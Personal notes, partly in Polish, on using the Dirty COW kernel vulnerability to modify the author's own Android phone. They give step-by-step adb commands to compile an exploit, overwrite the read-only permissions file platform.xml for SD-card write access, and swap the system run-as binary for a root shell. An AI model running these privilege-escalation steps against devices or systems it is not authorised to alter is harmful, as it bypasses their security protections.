===================================================
====== DirtyCowY - SD Write Permissions Hack ======
===================================================

---------- Info ----------
adb shell
wersja jądra - podatność na dirty cow:
cat /proc/version

Wykonanie pliku z adb:
adb push executable /data/local/tmp
adb shell
cd /data/local/tmp
chmod 755 executable
./executable

Android PoC: https://github.com/timwr/CVE-2016-5195

Odzyskiwanie partycji system po reboot:
something on this device keeps rebooting and restoring the system partition if any file is changed. 
SELinux or dm-verity reset, revert, restore system partition

gwarancja: KNOX counter - non-void if 0

hasło 0xdeadbeef
deadbeef:
https://github.com/scumjr/dirtycow-vdso

---------- Metoda ----------
Nadpisać plik: /system/etc/permissions/platform.xml
Oryginalny: -rw-r--r-- root     root         6470 2015-08-04 13:14 platform.xml
pobranie backupa: adb pull /system/etc/permissions/platform.xml platform.xml.backup
W miejscu:
<permission name="android.permission.WRITE_EXTERNAL_STORAGE" >
	<group gid=”sdcard_r” />
	<group gid=”sdcard_rw” />
</permission>
Dopisać (plik platform.xml.fixed):
<permission name="android.permission.WRITE_EXTERNAL_STORAGE" >
	<group gid=”sdcard_r” />
	<group gid=”sdcard_rw” />
	<group gid=”media_rw” />
</permission>
platform.xml.fixed2 - po dopisaniu wiersza, wycięcie znaków komentarzy, aby rozmiar się zgadzał
platform.xml.fixed3 - dodanie dodatkowych uprawnień

Nadpisany plik/system/etc/permissions/platform.xml (nie zmienia daty modyfikacji):
-rw-r--r-- root     root         6470 2015-08-04 13:14 platform.xml

przed nadpisaniem: ls -al /system/bin/run-as
-rwxr-x--- root     shell        9436 2016-10-10 22:54 run-as

---------- Foldery ----------
/storage/emulated/legacy/tmp/dirtycowy/ - Shared folder komputer - smyrafon - Termux (w pamięci telefonu)
/data/local/tmp/dirtycowy/ - Folder wykonywalny przez ADB
/data/data/com.termux/files/home - Folder startowy Termuxa (według Termuxa) - niedostępny, nieużywany
/home/igrek/dev/dirtycowy/sdrw/ - folder na komputerze z plikami do podmiany do eksportu na symrafon

---------- Dirty Cow Y SD RW ----------
--- 1. Pobrać backupy (jeśli jeszcze nie podmienione!!!) [TERMINAL]
adb pull /system/etc/permissions/platform.xml /home/igrek/dev/dirtycowy/sdrw/platform.xml.backup
adb pull /system/bin/run-as /home/igrek/dev/dirtycowy/sdrw/run-as.backup
--- 2. Wygenerować zmodyfikowane pliki platform.xml.backup i nazwać platform.xml.fixed* (wcięcia 4 spacje) [NANO]
--- 3. Umieścić zawartość /home/igrek/dev/dirtycowy/sdrw/ (zmodyfikowane pliki platform.xml.fixed*, pliki źródłowe *.c, backupy) na smyrafonie /storage/emulated/legacy/tmp/dirtycowy/ [MTP, THUNAR]
--- 4. Kompilacja gcc [TERMUX]
cd /storage/emulated/legacy/tmp/dirtycowy
gcc -pthread dirtycowy.c -o dirtycowy
gcc run-as.c -o run-as.fixed
Lub przez ./compile-dirtycowy.py (w /storage/emulated/legacy/tmp/dirtycowy/):
cp /storage/emulated/legacy/tmp/dirtycowy/compile-dirtycowy.py ~/
cd ~
./compile-dirtycowy.py
--- 5. Skopiowanie binarki dirtycowy do folderu wykonywalnego przez ADB [ADB SHELL]
cp /storage/emulated/legacy/tmp/dirtycowy/dirtycowy /data/local/tmp/dirtycowy/
chmod -R 777 /data/local/tmp/dirtycowy/
--- 6. Wykonać TEST, sprawdzić wynik [ADB SHELL]
cp /storage/emulated/legacy/tmp/dirtycowy/platform.xml.backup /storage/emulated/legacy/tmp/dirtycowy/platform.xml.test
/data/local/tmp/dirtycowy/dirtycowy
/data/local/tmp/dirtycowy/dirtycowy compare /storage/emulated/legacy/tmp/dirtycowy/platform.xml.test /storage/emulated/legacy/tmp/dirtycowy/platform.xml.fixed2
/data/local/tmp/dirtycowy/dirtycowy overwrite /storage/emulated/legacy/tmp/dirtycowy/platform.xml.test /storage/emulated/legacy/tmp/dirtycowy/platform.xml.fixed2
/data/local/tmp/dirtycowy/dirtycowy compare /storage/emulated/legacy/tmp/dirtycowy/platform.xml.test /storage/emulated/legacy/tmp/dirtycowy/platform.xml.fixed2
--- 7. WYKONAĆ DIRTY COW Y SD RW HACK, sprawdzić wynik [ADB SHELL]
/data/local/tmp/dirtycowy/dirtycowy compare /system/etc/permissions/platform.xml /storage/emulated/legacy/tmp/dirtycowy/platform.xml.fixed2
/data/local/tmp/dirtycowy/dirtycowy overwrite /system/etc/permissions/platform.xml /storage/emulated/legacy/tmp/dirtycowy/platform.xml.fixed2
/data/local/tmp/dirtycowy/dirtycowy compare /system/etc/permissions/platform.xml /storage/emulated/legacy/tmp/dirtycowy/platform.xml.fixed2

---------- RUN-AS ROOT ----------
--- 1. Pobrać backupy (jeśli jeszcze nie podmienione!!!) [TERMINAL]
adb pull /system/bin/run-as /home/igrek/dev/dirtycowy/sdrw/run-as.backup
--- 2. Podmiana /system/bin/run-as [ADB SHELL]
/data/local/tmp/dirtycowy/dirtycowy compare /system/bin/run-as /storage/emulated/legacy/tmp/dirtycowy/run-as.fixed
/data/local/tmp/dirtycowy/dirtycowy overwrite /system/bin/run-as /storage/emulated/legacy/tmp/dirtycowy/run-as.fixed
/data/local/tmp/dirtycowy/dirtycowy compare /system/bin/run-as /storage/emulated/legacy/tmp/dirtycowy/run-as.fixed
--- 3. Wykonanie /system/bin/run-as [ADB SHELL]
/system/bin/run-as
--- 4. Kim jestem ? [ADB SHELL]
id
--- 5. Przywrócenie oryginalnego run-as [ADB SHELL]
/data/local/tmp/dirtycowy/dirtycowy compare /system/bin/run-as /storage/emulated/legacy/tmp/dirtycowy/run-as.backup
/data/local/tmp/dirtycowy/dirtycowy overwrite /system/bin/run-as /storage/emulated/legacy/tmp/dirtycowy/run-as.backup
/data/local/tmp/dirtycowy/dirtycowy compare /system/bin/run-as /storage/emulated/legacy/tmp/dirtycowy/run-as.backup
